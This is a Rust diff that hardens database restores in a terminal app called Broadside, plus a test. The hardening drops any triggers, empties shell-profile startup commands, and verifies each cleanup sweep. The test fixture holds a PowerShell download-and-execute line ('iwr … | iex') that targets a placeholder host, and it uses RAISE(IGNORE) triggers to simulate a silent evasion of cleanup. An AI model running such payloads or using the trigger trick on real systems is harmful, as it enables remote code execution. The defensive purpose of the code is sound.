@@ -33,6 +33,9 @@ pub struct RestoreReport {
     /// Trusted host keys the restore cleared, so the next connect to each host
     /// asks again.
     pub cleared_host_keys: usize,
+    /// Shell profiles whose startup command the restore emptied. The profiles
+    /// themselves come back; see [`harden_restored_db`].
+    pub cleared_startup_commands: usize,
     /// Whether the restored file had sudo auto-fill on, in which case it was
     /// turned back off. False when it was already off, i.e. nothing changed.
     pub sudo_autofill_disabled: bool,
@@ -156,6 +159,7 @@ pub fn restore_app_data(path: String, state: State<'_, DbState>) -> AppResult<Re
         host_count,
         dropped_terminals: hardening.dropped_terminals,
         cleared_host_keys: hardening.cleared_host_keys,
+        cleared_startup_commands: hardening.cleared_startup_commands,
         sudo_autofill_disabled: hardening.sudo_autofill_disabled,
     })
 }
@@ -164,6 +168,7 @@ pub fn restore_app_data(path: String, state: State<'_, DbState>) -> AppResult<Re
 pub(crate) struct RestoreHardening {
     pub dropped_terminals: usize,
     pub cleared_host_keys: usize,
+    pub cleared_startup_commands: usize,
     pub sudo_autofill_disabled: bool,
 }
 
@@ -216,9 +221,30 @@ pub(crate) struct RestoreHardening {
 /// you think it is" has been answered in advance by the file. Cleared instead,
 /// so the first connect asks. That is one dialog per host, once, which is the
 /// question those dialogs exist to ask.
+///
+/// `shell_profiles` (build 69) is the same problem in one column. A profile's
+/// `startup_command` is typed into a local shell when the profile is clicked,
+/// and nothing guards that path, so a planted "Broadside dev" profile carrying
+/// a payload is one ordinary click from running. The rest of a profile (name,
+/// shell, folder, colour, order) is only a way of opening a shell the operator
+/// could open by hand, so profiles come back and the command is cleared.
+/// Retyping one line per profile is the price, and it puts what runs back in
+/// front of the person whose machine it is.
+///
+/// Every statement here runs against a schema the file supplied. So first every
+/// trigger goes: Broadside defines none, and a `BEFORE DELETE` or `BEFORE
+/// UPDATE` trigger doing `RAISE(IGNORE)` would otherwise make each sweep below
+/// change nothing and still report success. Then each sweep is read back, so a
+/// sweep that did not happen is an error rather than a success.
 pub(crate) fn harden_restored_db(conn: &rusqlite::Connection) -> AppResult<RestoreHardening> {
+    drop_all_triggers(conn)?;
+
     let dropped_terminals = conn.execute("DELETE FROM custom_terminals", [])?;
     let cleared_host_keys = conn.execute("DELETE FROM host_keys", [])?;
+    let cleared_startup_commands = conn.execute(
+        "UPDATE shell_profiles SET startup_command = '' WHERE startup_command <> ''",
+        [],
+    )?;
 
     // The one setting that is not a preference. Sudo auto-fill decides whether
     // stored passwords get typed into a session on the host's say-so, and the
@@ -234,11 +260,51 @@ pub(crate) fn harden_restored_db(conn: &rusqlite::Connection) -> AppResult<Resto
         crate::db::settings::set(conn, crate::commands::settings::KEY_SUDO_AUTOFILL, "false")?;
     }
 
+    // Read back. A sweep that silently changed nothing must not report success.
+    let swept = count(conn, "SELECT COUNT(*) FROM custom_terminals")? == 0
+        && count(conn, "SELECT COUNT(*) FROM host_keys")? == 0
+        && count(
+            conn,
+            "SELECT COUNT(*) FROM shell_profiles WHERE startup_command <> ''",
+        )? == 0
+        && !crate::db::settings::get_bool(
+            conn,
+            crate::commands::settings::KEY_SUDO_AUTOFILL,
+            true,
+        )?;
+    if !swept {
+        return Err(AppError::State(
+            "the restore could not remove what a restored file is not allowed to keep".into(),
+        ));
+    }
+
     Ok(RestoreHardening {
         dropped_terminals,
         cleared_host_keys,
+        cleared_startup_commands,
         sudo_autofill_disabled,
     })
+}
+
+fn count(conn: &rusqlite::Connection, sql: &str) -> AppResult<i64> {
+    Ok(conn.query_row(sql, [], |r| r.get(0))?)
+}
+
+/// Removes every trigger in the database. Broadside's own schema defines none,
+/// so any trigger present arrived in a restored file.
+fn drop_all_triggers(conn: &rusqlite::Connection) -> AppResult<()> {
+    let names: Vec<String> = {
+        let mut stmt = conn.prepare("SELECT name FROM sqlite_master WHERE type = 'trigger'")?;
+        let rows = stmt.query_map([], |r| r.get(0))?;
+        rows.collect::<Result<_, _>>()?
+    };
+    for name in names {
+        conn.execute_batch(&format!(
+            "DROP TRIGGER IF EXISTS \"{}\"",
+            name.replace('"', "\"\"")
+        ))?;
+    }
+    Ok(())
 }
 
 #[cfg(test)]
@@ -438,5 +504,62 @@ mod tests {
         let hosts = host_repo::list_all(&live).unwrap();
         assert_eq!(hosts.len(), 1);
         assert_eq!(hosts[0].label, "from-backup");
+    }
+
+    /// A profile's startup command is typed into a shell on the next click, so
+    /// a restore keeps the profile and empties the command. And a file that
+    /// brings triggers to make the sweeps silently do nothing (`RAISE(IGNORE)`
+    /// turns a DELETE or UPDATE into a no-op that still reports success) has
+    /// them dropped first, so the sweeps still happen.
+    #[test]
+    fn a_restored_file_cannot_keep_a_startup_command_even_with_triggers() {
+        use crate::db::shell_profiles::{self as profiles, ShellProfileInput};
+
+        let live = open_in_memory().unwrap();
+        profiles::create(
+            &live,
+            "p-1",
+            &ShellProfileInput {
+                label: "Broadside dev".into(),
+                shell_id: "pwsh".into(),
+                cwd: r"C:\src".into(),
+                startup_command: "iwr https://example.invalid/x | iex".into(),
+                color: "#3b82f6".into(),
+            },
+            None,
+        )
+        .unwrap();
+        live.execute(
+            "INSERT INTO custom_terminals
+                 (label, exe_path, args_json, family, sort_order, created_at, updated_at)
+             VALUES ('PowerShell 7', 'C:\\pwsh.exe', '[]', 'powershell', 0, 'then', 'then')",
+            [],
+        )
+        .unwrap();
+        live.execute_batch(
+            "CREATE TRIGGER keep_command BEFORE UPDATE ON shell_profiles
+                 BEGIN SELECT RAISE(IGNORE); END;
+             CREATE TRIGGER keep_terminal BEFORE DELETE ON custom_terminals
+                 BEGIN SELECT RAISE(IGNORE); END;",
+        )
+        .unwrap();
+
+        let report = harden_restored_db(&live).unwrap();
+        assert_eq!(report.cleared_startup_commands, 1);
+        assert_eq!(report.dropped_terminals, 1, "the trigger did not save it");
+
+        let p = profiles::get(&live, "p-1").unwrap();
+        assert_eq!(p.startup_command, "", "the command is gone");
+        assert_eq!(p.label, "Broadside dev", "and the profile is not");
+        assert_eq!(p.cwd, r"C:\src");
+        assert_eq!(p.color, "#3b82f6");
+        let triggers: i64 = live
+            .query_row(
+                "SELECT COUNT(*) FROM sqlite_master WHERE type = 'trigger'",
+                [],
+                |r| r.get(0),
+            )
+            .unwrap();
+        assert_eq!(triggers, 0);
     }
 }
